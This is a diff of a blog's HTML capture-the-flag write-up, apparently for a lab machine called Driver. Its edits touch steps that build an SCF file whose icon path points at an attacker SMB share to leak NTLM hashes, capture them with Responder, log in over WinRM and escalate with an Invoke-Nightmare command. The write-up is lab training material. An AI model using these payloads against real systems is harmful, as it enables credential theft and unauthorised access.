@@ -236,7 +236,7 @@ Host script results:
 135/tcp  open  msrpc
 445/tcp  open  microsoft-ds
 5985/tcp open  wsman
-</code></pre></div><p>we have this port <strong>5985</strong> open , searching about it will find <a href="https://hacktricks.boitatech.com.br/pentesting/5985-5986-pentesting-winrm">this</a> Hacktricks post which we may utilize later .</p>
+</code></pre></div><p>we have this port <strong>5985</strong> open , which we may utilize later <a href="https://hacktricks.boitatech.com.br/pentesting/5985-5986-pentesting-winrm">check</a>.</p>
 <h2 id="enumeration">Enumeration:</h2>
 <p>we can start by visiting the web page and it will ask us for a username:password for  MFP firmware update center .</p>
 <p><img src="/media/Driver/20220226110700.png" alt="image"></p>
@@ -276,7 +276,7 @@ Host script results:
 <p>so if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capture it with <a href="https://github.com/lgandx/Responder">Responder</a> tool.</p>
 </li>
 <li>
-<p>and as the firmwares are checked manually so a user will click on the icon we will create .</p>
+<p>and as the firmwares are checked when the file we upload is loaded at the reviewer file explorer or if he clicked it we can get the hash we need.</p>
 </li>
 </ul>
 <h3 id="exploitation-">Exploitation :</h3>
@@ -284,11 +284,11 @@ Host script results:
 <li>searching for &ldquo;smb share and printer firmware update exploit&rdquo; will find this blog  <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a></li>
 <li>so creating the payload :</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>Shell<span style="color:#f92672">]</span>
-Command<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
-IconFile<span style="color:#f92672">=</span><span style="color:#ae81ff">\\</span>&lt;ip&gt;<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\M</span>esbaha.ico
-<span style="color:#f92672">[</span>Taskbar<span style="color:#f92672">]</span>
-Command<span style="color:#f92672">=</span>ToggleDesktop
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">[Shell]
+Command=2
+IconFile=\\&lt;ip&gt;\share\Mesbaha.ico
+[Taskbar]
+Command=ToggleDesktop
 </code></pre></div><p>and name it as <code>&quot;@hack.scf&quot;</code> and before uploading it run Responder to capture the hash (hopefully):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo responder -I tun0 -rdwv
 </code></pre></div><p>GREAT we have NTLMv2 hash now  :</p>
@@ -299,7 +299,7 @@ Command<span style="color:#f92672">=</span>ToggleDesktop
 <p>so we have username and password , now How can we login ?</p>
 <h2 id="foothold-">Foothold :</h2>
 <ul>
-<li>Most of the <strong>impacket</strong> tools that  takes username:password and try to login depends on SMB shares (i.e : ADMIN$ and C$) and hence they are not accessible they won&rsquo;t work .</li>
+<li>Most of the <strong>impacket</strong> tools that  takes username:password and try to login depends on SMB shares <strong><code>(i.e : ADMIN$ and C$)</code></strong> and hence they are not accessible they won&rsquo;t work .</li>
 <li>Remember the port we have found in the full port scan ?</li>
 <li>reading the blog article i have mentioned above</li>
 </ul>
@@ -356,7 +356,7 @@ Invoke-Nightmare -NewUser <span style="color:#e6db74">&#34;0xMesbaha&#34;</span>
       </ul>
       
       <p class="post-copyright">
-        © all rights reserved for 0xMesbaha.This post was published <strong>115</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © all rights reserved for 0xMesbaha.This post was published <strong>117</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
